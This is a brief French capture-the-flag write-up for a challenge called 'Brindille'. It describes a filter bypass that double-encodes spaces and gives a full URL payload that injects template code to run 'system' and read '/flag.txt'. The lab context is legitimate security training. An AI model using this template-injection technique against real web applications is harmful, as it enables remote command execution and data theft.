## Solve - Brindille

On pouvait observer que le développeur avait laissé du code de debug permettant de récupérer les paramètres de la requête à partir de la variable
global ``_context``.

La difficulté résidant dans les filtres appliqué sur les paramètres, il fallait trouver un moyen de les contourner.  

Il n'était pas possible de mettre directement des espaces mais il était possible de les réencoder pour bypass le filtrage.

``http://un_nom_de_domaine/?EMAIL=%22{%if%2520[_context.GET.payload]|filter(_context.GET.system)%}%22%40gmail.com&NAME={%endif%}&payload=cat /flag.txt&system=system``